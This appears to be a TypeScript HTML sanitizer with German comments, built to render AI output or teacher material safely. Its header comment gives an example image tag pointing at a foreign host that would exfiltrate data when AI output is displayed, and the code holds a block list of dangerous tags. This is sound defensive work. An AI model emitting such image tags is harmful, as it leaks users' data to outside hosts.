/**
 * HTML aus KI-Ausgaben oder Material der Lehrkraft sicher anzeigen (22.10.2026, KI-Sicherheitsprüfung, OWASP LLM05).
 * Vorher entfernte die Hilfekarte nur <script> und on…="…" – ein <img src="https://fremd/?daten"> hätte beim Anzeigen
 * Daten nach außen getragen (Markdown-/Bild-Exfiltration), andere Ereignis-Schreibweisen wären durchgerutscht.
 * Jetzt: feste Liste erlaubter Tags; Attribute nur style/colspan/rowspan; Bilder nur als data:-URL; keine Links.
 */
const TAGS = new Set([
  'p', 'br', 'b', 'strong', 'i', 'em', 'u', 's', 'sub', 'sup', 'span', 'div', 'ul', 'ol', 'li', 'h3', 'h4', 'h5', 'h6',
  'blockquote', 'code', 'pre', 'hr', 'table', 'thead', 'tbody', 'tr', 'td', 'th', 'img', 'mark', 'small'
])
const ATTRIBUTE = new Set(['style', 'colspan', 'rowspan', 'alt'])

function reinigen(el: Element): void {
  for (const kind of [...el.children]) {
    const tag = kind.tagName.toLowerCase()
    if (!TAGS.has(tag)) {
      // Unbekannte Hülle (z. B. <a>, <font>): Text behalten; gefährliche (script, style, iframe, svg …) ganz weg
      if (/^(script|style|iframe|object|embed|svg|math|template|link|meta|form|input|button|textarea|select)$/.test(tag)) kind.remove()
      else {
        reinigen(kind)
        kind.replaceWith(...kind.childNodes)
      }
      continue
    }
    for (const a of [...kind.attributes]) {
      const name = a.name.toLowerCase()
      const wert = a.value
      if (tag === 'img' && name === 'src' && /^data:image\/(png|jpeg|gif|webp);base64,/i.test(wert)) continue
      if (!ATTRIBUTE.has(name) || (name === 'style' && /url\s*\(|expression|@import/i.test(wert))) kind.removeAttribute(a.name)
    }
    if (tag === 'img' && !kind.getAttribute('src')) {
      kind.remove()
      continue
    }
    reinigen(kind)
  }
}

export function sicheresHtml(html: string): string {
  if (typeof DOMParser === 'undefined') return String(html ?? '').replace(/[<>]/g, '')
  const doc = new DOMParser().parseFromString(`<div>${String(html ?? '')}</div>`, 'text/html')
  const wurzel = doc.body.firstElementChild
  if (!wurzel) return ''
  reinigen(wurzel)
  return wurzel.innerHTML
}
